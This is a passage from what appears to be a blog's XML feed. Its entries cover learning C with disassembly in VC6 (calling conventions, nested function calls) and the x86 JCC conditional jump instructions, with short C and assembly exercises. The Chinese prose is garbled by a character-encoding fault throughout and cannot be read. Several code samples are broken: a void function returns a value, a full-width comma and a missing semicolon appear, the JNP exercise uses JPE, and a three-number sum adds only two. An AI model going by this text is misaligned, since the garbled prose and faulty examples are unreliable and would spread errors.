src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715051770389.jpg" srcset="/img/loading.gif" alt="-w1311"><br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715052426371.jpg" srcset="/img/loading.gif" alt="-w1254"><br>ï¼ˆç®­å¤´æŒ‡çš„ä¸æ˜¯ç‰¹åˆ«å¥½â€¦â€¦ï¼‰</p><h3 id="é€†æˆcä»£ç "><a href="#é€†æˆcä»£ç " class="headerlink" title="é€†æˆcä»£ç "></a>é€†æˆcä»£ç </h3><pre><code>#include &quot;stdafx.h&quot;int __stdcall plus2(int a,int b,int c){    return a+b+c;}int __cdecl plus3(int a,int b){    return a+b;}int __fastcall plus(int a,int b,int c,int d,int e){    int z,s;    z=plus2(a,b,c);    s=plus3(b,a);    return plus3(z,s);}int main(int argc, char* argv[]){    int x;    x=plus(1,3,4,6,7);    printf(&quot;%d\n&quot;,x);    return 0;}</code></pre><p>è¿™ä¸ªç»ƒä¹ è¿‡ç¨‹å…¶å®æ˜¯ååˆ†è‰°éš¾çš„ï¼Œæˆ‘åˆ†æäº†æœ‰ä¸€ä¸ªå°æ—¶å·¦å³ï¼Œä¸»è¦æ˜¯</p><ul><li>å¼€å§‹å¯¹å±€éƒ¨å˜é‡æœ‰äº›ç”Ÿç–ï¼Œå‡½æ•°å†…éƒ¨å®šä¹‰ä¸€ä¸ªå˜é‡åæ±‡ç¼–ä¸­ä¼šå¦‚ä½•æ˜¾ç¤ºã€</li><li>fastcallçš„è®¤è¯†ä¸æ˜¯å¾ˆå¥½</li><li>ä¼ å…¥çš„<code>6 7</code>åšäº†ä»€ä¹ˆä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥š<br>æœ€åç»“åˆidaç”Ÿæˆçš„ä¼ªä»£ç æ‰å®Œæˆï¼Œä¸è¿‡ç»è¿‡è¿™ä¸ªç»ƒä¹ éƒ½å­¦åˆ°äº†å¾ˆå¤šï¼Œä½¿ç”¨idaä¹Ÿæ„Ÿå—åˆ°äº†idaçš„å¼ºå¤§ï¼Œå­¦åˆ°äº†åœ¨å…¶ä¸­å¦‚ä½•çœ‹ä¸€äº›ç®€å•çš„å‡½æ•°ä»¥åŠå…¶ä¸çœŸæ­£æ±‡ç¼–ä»£ç çš„åŒºåˆ«ã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰</h1><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>æœ¬è¯¾ä¸»è¦å­¦ä¹ VCå¼€å‘ç¯å¢ƒçš„ç®€å•ä½¿ç”¨ï¼Œå’Œå‡ ä¸ªå‡½æ•°åæ±‡ç¼–åˆ†æã€‚</p><h2 id="ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ"><a href="#ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ" class="headerlink" title="ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ"></a>ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ</h2><p>è¿™é‡Œæˆ‘ç›´æ¥ç”¨äº†ç¼–ç¨‹è¾¾äººçš„vcè™šæ‹Ÿæœºï¼Œå®˜æ–¹çš„vc6.0ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œæ¯æ¬¡åªæ”¯æŒè°ƒè¯•ä¸€æ¬¡ï¼Œäººå®¶çš„å¯ä»¥çªç ´è¿™ä¸ªé™åˆ¶ã€‚</p><h3 id="åˆ›å»ºé¡¹ç›®"><a href="#åˆ›å»ºé¡¹ç›®" class="headerlink" title="åˆ›å»ºé¡¹ç›®"></a>åˆ›å»ºé¡¹ç›®</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714523427592.jpg" srcset="/img/loading.gif" alt="-w911"></p><h3 id="æ‰§è¡Œè¿‡ç¨‹"><a href="#æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="æ‰§è¡Œè¿‡ç¨‹"></a>æ‰§è¡Œè¿‡ç¨‹</h3><p>ä»£ç ç¼–å†™â€“&gt;ç”ŸæˆEXE(F7)â€“&gt;è¿è¡Œ(F5)â€“&gt;ç»“æŸè¿è¡Œ(Shift+F5)</p><h3 id="ä¸€äº›ç®€å•æ“ä½œ"><a href="#ä¸€äº›ç®€å•æ“ä½œ" class="headerlink" title="ä¸€äº›ç®€å•æ“ä½œ"></a>ä¸€äº›ç®€å•æ“ä½œ</h3><h4 id="è®¾ç½®æ–­ç‚¹"><a href="#è®¾ç½®æ–­ç‚¹" class="headerlink" title="è®¾ç½®æ–­ç‚¹"></a>è®¾ç½®æ–­ç‚¹</h4><p><strong>è®¾ç½®æ–­ç‚¹</strong>æ˜¯å…‰æ ‡æ”¾åˆ°å“ªè¡Œä»£ç åæŒ‰ä¸‹<code>F9</code>å³å¯ï¼Œè¿™ä¹Ÿæ˜¯åé¢å¾ˆå¤šæ“ä½œçš„æœ€é‡è¦çš„èµ·åˆæ“ä½œã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714525807811.jpg" srcset="/img/loading.gif" alt="-w338"></p><h4 id="è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£"><a href="#è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£" class="headerlink" title="è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£"></a>è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£</h4><p><strong>è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£</strong><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714528282225.jpg" srcset="/img/loading.gif" alt="-w586"><br>çœ‹å›¾ï¼Œåœ¨ç©ºç™½å¤„å³å‡»ç‚¹å‡»ä¸€ä¸‹ä½ éœ€è¦çš„çª—å£å°±å¥½äº†ã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714528997602.jpg" srcset="/img/loading.gif" alt="-w526"></p><h4 id="è¿›å…¥åæ±‡ç¼–çª—å£"><a href="#è¿›å…¥åæ±‡ç¼–çª—å£" class="headerlink" title="è¿›å…¥åæ±‡ç¼–çª—å£"></a>è¿›å…¥åæ±‡ç¼–çª—å£</h4><p>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œä¸”æœ‰é€‚å½“æ–­ç‚¹çš„æ—¶å€™ï¼Œçœ‹å›¾<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714530279259.jpg" srcset="/img/loading.gif" alt="-w517"></p><p>å³å‡»ç¨‹åºæ¡†å†…çš„ç©ºç™½å¤„ï¼Œç„¶åç‚¹å‡»GO to Disassembly å°±å¥½äº†ã€‚åœ¨è¿™é‡Œé¢æœ€é‡è¦çš„æ“ä½œå°±æ˜¯ï¼š<code>F10 F11</code>åˆ†åˆ«æ˜¯æ­¥è¿‡å’Œæ­¥å…¥ã€‚è¿™ä¸ªè·Ÿodé‡Œä¸ä¸€æ ·ã€‚</p><h2 id="Cè¯­è¨€çš„è°ƒç”¨"><a href="#Cè¯­è¨€çš„è°ƒç”¨" class="headerlink" title="Cè¯­è¨€çš„è°ƒç”¨"></a>Cè¯­è¨€çš„è°ƒç”¨</h2><p>1ã€æ— å‚æ•°ï¼Œæ— è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨<br>2ã€æœ‰å‚æ•°ï¼Œæ— è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨<br>3ã€æ— å‚æ•°ï¼Œæœ‰è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨<br>4ã€æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨</p><h2 id="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°"><a href="#å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°" class="headerlink" title="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°"></a>å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°</h2><h3 id="å…ˆä¸Šcï¼š"><a href="#å…ˆä¸Šcï¼š" class="headerlink" title="å…ˆä¸Šcï¼š"></a>å…ˆä¸Šcï¼š</h3><pre><code>#include &quot;stdafx.h&quot;void Function(){}int main(int argc, char* argv[]){    Function()    return 0;}</code></pre><h3 id="åæ±‡ç¼–åˆ†æï¼š"><a href="#åæ±‡ç¼–åˆ†æï¼š" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714535234194.jpg" srcset="/img/loading.gif" alt="-w438"></p><h2 id="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½"><a href="#å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½" class="headerlink" title="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½"></a>å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½</h2><h3 id="ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š"><a href="#ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š" class="headerlink" title="ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š"></a>ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š</h3><h4 id="cä»£ç ï¼š"><a href="#cä»£ç ï¼š" class="headerlink" title="cä»£ç ï¼š"></a>cä»£ç ï¼š</h4><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1);    return 0;}</code></pre><h4 id="åæ±‡ç¼–åˆ†æï¼š-1"><a href="#åæ±‡ç¼–åˆ†æï¼š-1" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h4><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714537632825.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š"><a href="#ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š" class="headerlink" title="ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š"></a>ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š</h3><h4 id="cä»£ç ï¼š-1"><a href="#cä»£ç ï¼š-1" class="headerlink" title="cä»£ç ï¼š"></a>cä»£ç ï¼š</h4><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int yï¼Œint z){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1,3);    return 0;}</code></pre><h4 id="åæ±‡ç¼–åˆ†æï¼š-2"><a href="#åæ±‡ç¼–åˆ†æï¼š-2" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h4><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714539277702.jpg" srcset="/img/loading.gif" alt="-w974"><br>ï¼ˆå’Œä¸Šé¢é‚£ä¸ªåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯ä¸ºäº†ç»ƒä¹ ï¼Œä¸è¯¦ç»†å†™äº†ï¼‰</p><h2 id="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨"><a href="#å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨" class="headerlink" title="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨"></a>å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨</h2><p>è¦æ±‚ï¼šç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå®ç°å¯¹ä»»æ„5ä¸ªæ•´æ•°å®ç°åŠ æ³•(ä½¿ç”¨Plus1å’ŒPlus2).</p><h3 id="cä»£ç "><a href="#cä»£ç " class="headerlink" title="cä»£ç "></a>cä»£ç </h3><pre><code>#include &quot;stdafx.h&quot;int Plus1(int x,int y){    return x+y;}int Plus2(int x,int y,int z){    return x+y+z;}int Plus3(int a,int b,int c,int d,int e){    int i,j,m;    i=Plus1(a,b);    j=Plus2(c,d,e);    m=Plus1(i,j);    return m;}int main(int argc, char* argv[]){    Plus3(2,1,3,1,5);    return 0;}</code></pre><h3 id="åæ±‡ç¼–åˆ†æï¼š-3"><a href="#åæ±‡ç¼–åˆ†æï¼š-3" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714541318519.jpg" srcset="/img/loading.gif" alt="-w1534"><br>ï¼ˆä¸­é—´è°ƒç”¨ä¸€ä¸ªPlus1 å’Œ Plus2ï¼Œå°±ä¸å¿…è¿›å…¥åˆ†æäº†ï¼ŒåŸºæœ¬è·Ÿå‰é¢ç®€å•åˆ†æé‚£ä¸¤ä¸ªä¸€æ ·ï¼Œè¿™ä¸ªç»ƒä¹ æ˜¯é¡ºæˆä¸‹æ¥çš„ã€‚ï¼‰</p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>å­¦å®Œæ±‡ç¼–äº†ï¼Œå°±æ¥ç€Cä¸æ±‡ç¼–ç»“åˆåˆ†æï¼Œæ­¥æ­¥æŠŠå¸¸è§çš„ç»“åˆåˆ†æå®Œã€‚è¿™æ¬¡å­¦ä¹ ä¸ç»ƒä¹ ï¼Œå¯ä»¥ä¸€æ•´æ®µä¸€æ•´æ®µçš„è¯»æ±‡ç¼–ä»£ç äº†ï¼Œ<strong>ï¼ˆè¿™ä¸ªå‰é¢å…¶å®è¿˜æœ‰ç”»è¿‡å †æ ˆå›¾ï¼Œå½“æ—¶æ˜¯ä¸€å¥å¥åˆ†æå­¦ä¹ çš„ï¼Œä¸ºäº†ç†Ÿæ‚‰å †æ ˆå’Œæ±‡ç¼–è¯­å¥ï¼Œæ‰¾æ—¶é—´è¡¥ä¸‹ç¬”è®°</strong>ï¼‰ä¹Ÿç†Ÿæ‚‰äº†å‡½æ•°æ˜¯å¦‚ä½•åµŒå¥—è°ƒç”¨çš„ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JCCå­¦ä¹ </title>
    <link href="/2019/10/07/JCC/"/>
    <url>/2019/10/07/JCC/</url>
    
    <content type="html"><![CDATA[<h1 id="JCCå­¦ä¹ "><a href="#JCCå­¦ä¹ " class="headerlink" title="JCCå­¦ä¹ "></a>JCCå­¦ä¹ </h1><h2 id="JCCæŒ‡ä»¤é›†åˆ"><a href="#JCCæŒ‡ä»¤é›†åˆ" class="headerlink" title="JCCæŒ‡ä»¤é›†åˆ"></a>JCCæŒ‡ä»¤é›†åˆ</h2><h3 id="è¯¦ç»†"><a href="#è¯¦ç»†" class="headerlink" title="è¯¦ç»†__"></a>è¯¦ç»†__</h3><p>1ã€JE, JZã€€ã€€ã€€ã€€ã€€ã€€ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬)ã€€ã€€ã€€ã€€ ã€€ã€€ ZF=1</p><p>2ã€JNE, JNZã€€ã€€  ã€€ã€€ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ã€€ã€€ã€€ã€€   ZF=0</p><p>3ã€JSã€€ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€    SF=1</p><p>4ã€JNS ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€   SF=0</p><p>5ã€JP, JPEã€€ã€€ã€€ã€€ã€€ ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€      PF=1</p><p>6ã€JNP, JPOã€€ã€€ã€€ã€€  ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€      PF=0</p><p>7ã€JOã€€ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€      OF=1</p><p>8ã€JNO ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€            OF=0</p><p>9ã€JB, JNAE ã€€ã€€ã€€ã€€ å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€   CF=1</p><p>10ã€JNB, JAE ã€€ã€€ã€€  å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€   CF=0</p><p>11ã€JBE, JNA  ã€€ã€€ã€€ å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€  CF=1 or ZF=1</p><p>12ã€JNBE, JA ã€€ã€€ã€€  å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  CF=0 and ZF=0</p><p>13ã€JL, JNGE ã€€ã€€ã€€  å°äºåˆ™è·³è½¬ (<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€    SFâ‰  OF</p><p>14ã€JNL, JGEã€€ã€€ã€€   å¤§äºç­‰äºåˆ™è·³è½¬ (<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€    SF=OF</p><p>15ã€JLE, JNG  ã€€ã€€ã€€ å°äºç­‰äºåˆ™è·³è½¬ (<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€    ZF=1 or SFâ‰  OF</p><p>16ã€JNLE, JG ã€€ã€€ã€€  å¤§äºåˆ™è·³è½¬(<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€     ZF=0 and SF=OF</p><h3 id="è¡¨æ ¼æ€»ç»“"><a href="#è¡¨æ ¼æ€»ç»“" class="headerlink" title="è¡¨æ ¼æ€»ç»“"></a>è¡¨æ ¼æ€»ç»“</h3><p><img src="/2019/10/07/JCC/images/15713086707312.jpg" srcset="/img/loading.gif" alt="-w1067"></p><p>ç›´æ¥æ‘˜æŠ„çš„åšçš„å¾ˆè¯¦ç»†ï¼Œæ­£å¥½æœ‰åŠ©è®°ï¼Œä½†æ˜¯éœ€è¦å’Œä¸Šé¢è¯¦ç»†æŒ‡ä»¤æ­é…ä½¿ç”¨ï¼Œè¦<strong>æ³¨æ„é‚£äº›æœ‰ç¬¦å·çš„JCCè·³è½¬æŒ‡ä»¤ï¼Œ</strong>å› ä¸ºåœ¨è¿™ä¸ªè¡¨é‡Œæ²¡æœ‰ä½“ç°ã€‚ä¹Ÿä¸ç”¨å¤ªç€æ€¥èƒŒï¼Œç†Ÿæ‚‰ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œæœ‰éƒ¨åˆ†æ˜¯å¯ä»¥ç›´æ¥è®°ä½çš„ï¼Œåœ¨å¾€åé‡åˆ°æ¨¡ç³Šçš„ç›´æ¥æŸ¥ä¸‹å°±å¯ä»¥äº†ã€‚</p><h3 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h3><p><strong>JCCæŒ‡ä»¤å†³å®šå®ƒè·³ä¸è·³è½¬è·Ÿåˆ«çš„æ²¡å…³ç³»ï¼Œåªè·ŸEFLAGæ ‡å¿—å¯„å­˜å™¨æœ‰å…³ç³»ï¼Œæ ¹æ®ç¬¦å·ä½æ¥è¿›è¡Œè·³è½¬çš„</strong></p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬"><a href="#ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬" class="headerlink" title="ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬."></a>ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬.</h3><p>å‰æï¼šèƒ½ç”¨CMPå’ŒTESTå®ç°çš„ä¼˜å…ˆè€ƒè™‘.</p><h4 id="1ã€JE-JZ-ç»“æœä¸ºé›¶åˆ™è·³è½¬-ç›¸ç­‰æ—¶è·³è½¬-ZF-1"><a href="#1ã€JE-JZ-ç»“æœä¸ºé›¶åˆ™è·³è½¬-ç›¸ç­‰æ—¶è·³è½¬-ZF-1" class="headerlink" title="1ã€JE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬) ZF=1"></a>1ã€JE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬) ZF=1</h4><pre><code>MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B</code></pre><h4 id="2ã€JNE-JNZ-ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬-ä¸ç›¸ç­‰æ—¶è·³è½¬-ZF-0"><a href="#2ã€JNE-JNZ-ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬-ä¸ç›¸ç­‰æ—¶è·³è½¬-ZF-0" class="headerlink" title="2ã€JNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0"></a>2ã€JNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0</h4><pre><code>MOV AL,1TEST AL,ALJNZ 0X00401006</code></pre><h4 id="3ã€-JS-ç»“æœä¸ºè´Ÿåˆ™è·³è½¬-SF-1"><a href="#3ã€-JS-ç»“æœä¸ºè´Ÿåˆ™è·³è½¬-SF-1" class="headerlink" title="3ã€ JS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ SF=1"></a>3ã€ JS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ SF=1</h4><pre><code>MOV AL,1MOV CL,2CMP AL,CL</code></pre><h4 id="4ã€-JNS-ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬-SF-0"><a href="#4ã€-JNS-ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬-SF-0" class="headerlink" title="4ã€ JNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ SF=0"></a>4ã€ JNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ SF=0</h4><pre><code>XOR EAX,EAXJNS 0X0040102F</code></pre><h4 id="5ã€-JP-JPE-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬-PF-1"><a href="#5ã€-JP-JPE-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬-PF-1" class="headerlink" title="5ã€ JP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=1"></a>5ã€ JP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=1</h4><pre><code>MOV AL,2MOV CL,2CMP AL,CLJPE 0X00401008</code></pre><h4 id="6ã€JNP-JPO-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬-PF-0"><a href="#6ã€JNP-JPO-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬-PF-0" class="headerlink" title="6ã€JNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ PF=0"></a>6ã€JNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ PF=0</h4><pre><code>MOV AL,2MOV CL,1CMP AL,CLJPE 0X00401008</code></pre><h4 id="7ã€-JO-ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬-OF-1"><a href="#7ã€-JO-ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬-OF-1" class="headerlink" title="7ã€ JO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ OF=1"></a>7ã€ JO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ OF=1</h4><pre><code>MOV AL,80SUB AL,10JO 0X00401008</code></pre><h4 id="8ã€-JNO-ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬-OF-0"><a href="#8ã€-JNO-ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬-OF-0" class="headerlink" title="8ã€ JNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ OF=0"></a>8ã€ JNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ OF=0</h4><pre><code>MOV AX,0FFFFADD AX,80JNO 0X00401010</code></pre><h4 id="9ã€-JB-JNAE-å°äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1"><a href="#9ã€-JB-JNAE-å°äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1" class="headerlink" title="9ã€ JB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1"></a>9ã€ JB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1</h4><pre><code>MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E</code></pre><h4 id="10ã€-JNB-JAE-å¤§äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0"><a href="#10ã€-JNB-JAE-å¤§äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0" class="headerlink" title="10ã€ JNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=0"></a>10ã€ JNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=0</h4><pre><code>MOV AX,80MOV 